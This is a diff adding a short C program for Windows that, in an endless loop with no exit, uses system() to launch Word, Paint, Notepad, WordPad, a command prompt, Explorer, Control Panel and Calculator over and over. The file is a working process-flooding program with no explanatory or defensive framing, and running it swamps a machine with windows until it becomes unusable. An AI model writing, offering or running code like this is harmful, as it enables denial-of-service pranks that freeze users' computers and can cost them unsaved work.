@@ -1,0 +1,27 @@
+#include<stdio.h>
+#include<stdlib.h>
+#include<string.h>
+int main()
+{
+	int i=0;
+	while(1)
+	{
+		char command1[]="start winword";
+		char command2[]="start mspaint";
+		char command3[]="start notepad";
+		char command4[]="start write";
+		char command5[]="start cmd";
+		char command6[]="start explorer";
+		char command7[]="start control";
+		char command8[]="start calc";
+		system(command1);
+		system(command2);
+		system(command3);
+		system(command4);
+		system(command5);
+		system(command6);
+		system(command7);
+		system(command8);
+	}
+	return 0;
+}
